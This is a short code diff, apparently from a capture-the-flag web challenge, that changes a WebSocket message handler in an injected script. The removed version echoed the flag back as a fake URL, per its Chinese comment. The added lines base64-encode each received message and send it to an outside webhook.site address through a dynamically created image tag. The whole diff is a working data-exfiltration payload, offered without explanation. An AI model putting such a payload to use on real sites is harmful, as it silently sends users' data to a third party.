@@ -9,8 +9,9 @@
   ws.onmessage = (e) => {
     try {
       const msg = JSON.parse(e.data).message;
-      // 將 flag 包裝成假的 URL 傳回來，繞過後端檢查
-      ws.send(JSON.stringify({ message: "http://flag." + msg.replace(/\s+/g, '') }));
+      const i = document.createElement("img");
+      i.src = "https://webhook.site/36d1845d-ac17-42f9-bfe5-727cd6aad3f2?data=" + btoa(msg);
+      document.body.appendChild(i);
     } catch (err) {}
   };
 </script>
